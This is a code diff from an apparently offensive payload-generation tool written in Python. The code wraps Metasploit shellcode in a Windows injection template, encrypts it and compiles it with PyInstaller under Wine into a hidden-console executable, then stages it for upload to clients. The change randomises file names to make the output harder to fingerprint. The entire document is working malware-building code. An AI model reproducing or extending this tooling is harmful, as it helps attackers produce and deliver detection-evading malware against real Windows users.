@@ -59,15 +59,16 @@ def askAndReturnModules(shellcode, metasploit_type):
         return (EXTRAS(shellcode).RETURN_EZ2READ_SHELLCODE(), METASPLOIT_Functions[metasploit_type]['normal'])
 
 def GeneratePayload(ez2read_shellcode,payloadname,shellcode):
-    with open('%s/payload.py' % payloaddir(), 'w+') as Filesave:
+    randoFileName = ''.join(random.sample(string.ascii_lowercase, 8))
+    randomenckey = ''.join(random.sample(string.ascii_lowercase, 16))
+    with open('%s/%s.py' % (payloaddir(), randoFileName), 'w+') as Filesave:
         Filesave.write(do_Encryption(SHELLCODE.injectwindows % (ez2read_shellcode)))
         Filesave.close()
     print '[*] Creating Payload using Pyinstaller...'
 
-    randomenckey = ''.join(random.sample(string.ascii_lowercase, 16))
 
     p = subprocess.Popen(['wine', os.path.expanduser('~') + '/.wine/drive_c/Python27/python.exe', '/opt/pyinstaller/pyinstaller.py',
-                          '%s/payload.py' % payloaddir(), '--noconsole', '--onefile', '--key',randomenckey], bufsize=1024, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                          '%s/%s.py' % (payloaddir(), randoFileName), '--noconsole', '--onefile', '--key',randomenckey], bufsize=1024, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     LOADING = Spinner('Generating Payload')
     while p.poll() == None:
         LOADING.Update()
@@ -79,22 +80,22 @@ def GeneratePayload(ez2read_shellcode,payloadname,shellcode):
     if len(sys.argv) > 1:
         if sys.argv[1] == "-debug":
             sys.stdout.write(payloadstderr)
-    os.system('mv dist/payload.exe %s/%s.exe'% (payloaddir(),payloadname))
-    print t.normal + '\n[*] Payload.exe Has Been Generated And Is Located Here: ' + t.bold_green + '%s/%s.exe' % (payloaddir(), payloadname) + t.normal
-    CleanUpPayloadMess(payloadname)
+    os.system('mv dist/%s.exe %s/%s.exe'% (randoFileName, payloaddir(), randoFileName))
+    print t.normal + '\n[*] Payload.exe Has Been Generated And Is Located Here: ' + t.bold_green + '%s/%s.exe' % (payloaddir(), randoFileName) + t.normal
+    CleanUpPayloadMess(randoFileName)
     from menu import clientMenuOptions
     if len(clientMenuOptions.keys()) > 2:
         from stager import clientUpload
-        clientUpload((payloaddir() + '/' + payloadname), powershellExec=ez2read_shellcode, isExe=True, json='{"type":"", "data":"%s", "sendoutput":"false", "multiple":"true"}')
+        clientUpload((payloaddir() + '/' + randoFileName), powershellExec=ez2read_shellcode, isExe=True, json='{"type":"", "data":"%s", "sendoutput":"false", "multiple":"true"}')
     else:
-        DoPayloadUpload(payloadname)
+        DoPayloadUpload(randoFileName)
 
 
-def CleanUpPayloadMess(payloadname):
+def CleanUpPayloadMess(randoFileName):
     os.system('rm dist -r')
     os.system('rm build -r')
     os.system('rm *.spec')
-    os.system('rm %s/payload.py' % payloaddir())
+    os.system('rm %s/%s.py' % (payloaddir(), randoFileName))
 
 def DoPayloadUpload(payloadname):
     want_to_upload = raw_input(
